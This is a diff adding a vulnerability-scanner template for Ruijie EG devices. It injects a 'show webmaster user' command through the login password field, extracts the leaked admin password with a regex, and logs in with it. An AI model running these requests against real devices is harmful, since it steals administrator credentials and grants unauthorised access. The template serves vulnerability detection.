@@ -1,0 +1,57 @@
+id: ruijie-eg-info-leak
+
+info:
+  name: Ruijie EG Information Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    This template checks for an information leak vulnerability in Ruijie EG systems.
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?show+webmaster+user
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "text/json"
+    extractors:
+      - type: regex
+        name: password_extractor
+        group: 1
+        regex:
+          - '{"data":".*admin\s?(?P<password>[^\\"]*)'
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password={{password_extractor}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "text/json"
+          - "Set-Cookie"
+          - "user=admin"
+      - type: word
+        part: body
+        words:
+          - '{"data":"0","status":1}'
